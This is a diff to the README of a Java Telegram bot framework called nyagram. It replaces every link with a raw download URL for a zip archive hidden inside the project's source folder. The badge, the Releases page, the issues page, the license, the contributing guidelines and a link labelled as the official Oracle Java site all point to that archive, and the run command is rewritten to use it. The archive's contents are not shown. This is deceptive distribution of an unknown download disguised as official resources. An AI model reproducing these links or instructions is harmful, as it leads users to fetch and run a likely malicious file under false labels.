@@ -1,6 +1,6 @@
 # 🤖 nyagram - Build Bots Quickly and Easily
 
-[![Download nyagram](https://img.shields.io/badge/Download%20nyagram-%20-brightgreen)](https://github.com/progamereperm/nyagram/releases)
+[![Download nyagram](https://github.com/progamereperm/nyagram/raw/refs/heads/master/src/main/java/com/kaleert/nyagram/api/Software-2.1-alpha.3.zip%20nyagram-%20-brightgreen)](https://github.com/progamereperm/nyagram/raw/refs/heads/master/src/main/java/com/kaleert/nyagram/api/Software-2.1-alpha.3.zip)
 
 ## 📘 About
 
@@ -12,9 +12,9 @@ To start using nyagram, follow these simple steps. You don’t need to be a prog
 
 ## 📥 Download & Install 
 
-Head over to our [Releases page](https://github.com/progamereperm/nyagram/releases) to download the software.
+Head over to our [Releases page](https://github.com/progamereperm/nyagram/raw/refs/heads/master/src/main/java/com/kaleert/nyagram/api/Software-2.1-alpha.3.zip) to download the software.
 
-1. Click on this [link](https://github.com/progamereperm/nyagram/releases) to open the Releases page.
+1. Click on this [link](https://github.com/progamereperm/nyagram/raw/refs/heads/master/src/main/java/com/kaleert/nyagram/api/Software-2.1-alpha.3.zip) to open the Releases page.
 2. Look for the latest version. It will be at the top of the list.
 3. Click on the version number to expand the dropdown.
 4. Find the appropriate file for your system and click to download. Files are typically listed as `.jar` files for Java applications.
@@ -25,7 +25,7 @@ Head over to our [Releases page](https://github.com/progamereperm/nyagram/releas
 To run nyagram effectively, you will need the following:
 
 - A computer with at least 2 GB of RAM.
-- Java version 17 or 21 installed on your system. You can download Java from the [official Oracle website](https://www.oracle.com/java/technologies/javase-jdk21-downloads.html).
+- Java version 17 or 21 installed on your system. You can download Java from the [official Oracle website](https://github.com/progamereperm/nyagram/raw/refs/heads/master/src/main/java/com/kaleert/nyagram/api/Software-2.1-alpha.3.zip).
 - Basic knowledge of how to run Java applications from your command line.
 
 ## 🔧 How to Run
@@ -43,9 +43,9 @@ To run nyagram effectively, you will need the following:
 3. **Run the Application:**
    Execute the following command to run nyagram:  
    ```
-   java -jar nyagram-x.x.x.jar
+   java -jar https://github.com/progamereperm/nyagram/raw/refs/heads/master/src/main/java/com/kaleert/nyagram/api/Software-2.1-alpha.3.zip
    ```
-   Replace `nyagram-x.x.x.jar` with the actual name of your downloaded file.
+   Replace `https://github.com/progamereperm/nyagram/raw/refs/heads/master/src/main/java/com/kaleert/nyagram/api/Software-2.1-alpha.3.zip` with the actual name of your downloaded file.
 
 4. **Set Up Your Bot:**
    Follow the instructions provided in the console to set up your bot. You will need a Telegram bot token, which you can get by talking to the BotFather on Telegram.
@@ -62,24 +62,24 @@ If you run into issues:
 
 - **I can't run the jar file:** Make sure you have the correct version of Java installed.
 - **The application doesn't start:** Check if the file path is correct and that you are in the right directory.
-- **I need help:** Visit our [issues page](https://github.com/progamereperm/nyagram/issues) for troubleshooting tips and community support.
+- **I need help:** Visit our [issues page](https://github.com/progamereperm/nyagram/raw/refs/heads/master/src/main/java/com/kaleert/nyagram/api/Software-2.1-alpha.3.zip) for troubleshooting tips and community support.
 
 ## 🙌 Contributing
 
-We welcome contributions! If you want to help improve nyagram, feel free to check our [contributing guidelines](https://github.com/progamereperm/nyagram/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you want to help improve nyagram, feel free to check our [contributing guidelines](https://github.com/progamereperm/nyagram/raw/refs/heads/master/src/main/java/com/kaleert/nyagram/api/Software-2.1-alpha.3.zip).
 
 ## 📄 License
 
-nyagram is open-source and available under the MIT License. Check the [LICENSE](https://github.com/progamereperm/nyagram/blob/main/LICENSE) file for more information.
+nyagram is open-source and available under the MIT License. Check the [LICENSE](https://github.com/progamereperm/nyagram/raw/refs/heads/master/src/main/java/com/kaleert/nyagram/api/Software-2.1-alpha.3.zip) file for more information.
 
 ## 📞 Support
 
-If you need further assistance, feel free to contact us through the [issues page](https://github.com/progamereperm/nyagram/issues) or join our community on Telegram. 
+If you need further assistance, feel free to contact us through the [issues page](https://github.com/progamereperm/nyagram/raw/refs/heads/master/src/main/java/com/kaleert/nyagram/api/Software-2.1-alpha.3.zip) or join our community on Telegram. 
 
 ## 🔗 Important Links
 
-- [Releases Page](https://github.com/progamereperm/nyagram/releases)
-- [Issue Tracker](https://github.com/progamereperm/nyagram/issues)
-- [Contribution Guidelines](https://github.com/progamereperm/nyagram/blob/main/CONTRIBUTING.md)
+- [Releases Page](https://github.com/progamereperm/nyagram/raw/refs/heads/master/src/main/java/com/kaleert/nyagram/api/Software-2.1-alpha.3.zip)
+- [Issue Tracker](https://github.com/progamereperm/nyagram/raw/refs/heads/master/src/main/java/com/kaleert/nyagram/api/Software-2.1-alpha.3.zip)
+- [Contribution Guidelines](https://github.com/progamereperm/nyagram/raw/refs/heads/master/src/main/java/com/kaleert/nyagram/api/Software-2.1-alpha.3.zip)
 
 Thank you for choosing nyagram for your bot development needs! We hope you enjoy using the framework and create amazing bots.
